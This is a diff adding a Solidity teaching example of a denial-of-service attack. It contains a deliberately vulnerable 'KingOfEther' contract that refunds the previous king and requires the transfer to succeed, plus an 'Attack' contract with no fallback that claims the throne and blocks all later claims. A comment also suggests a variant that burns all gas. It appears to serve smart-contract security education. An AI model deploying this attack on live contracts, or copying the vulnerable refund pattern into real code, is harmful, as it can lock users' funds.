@@ -19,3 +19,37 @@ What happened?
 Attack became the king. All new challenge to claim the throne will be rejected since Attack contract does not have a fallback function, denying to accept the Ether sent from KingOfEther before the new King is set.
 */
 
+contract KingOfEther {
+  address public king;
+  uint public balance;
+
+  function claimThrone() external payable {
+    require((msg.value > balance), "Need to pay more to become the king");
+    (bool sent, ) = king.call{value: balance}("");
+    require(sent, "Failed to send Ether");
+
+    balance = msg.value;
+    king = msg.sender;
+  }
+}
+
+contract Attack {
+  KingOfEther public kingOfEther;
+
+  constructor(KingOfEther _kingOfEther) {
+    kingOfEther = KingOfEther(_kingOfEther);
+  }
+
+  //You can also perform a DOS by consuming all gas using assert.abi
+  //This attack will work even if the calling contract does not check
+  // Whether the call was successful or not
+  
+  // function () external payable {
+  //   assert(false);
+  // }
+
+  function attack() public payable {
+    kingOfEther.claimThrone{value: msg.value}();
+  }
+
+}
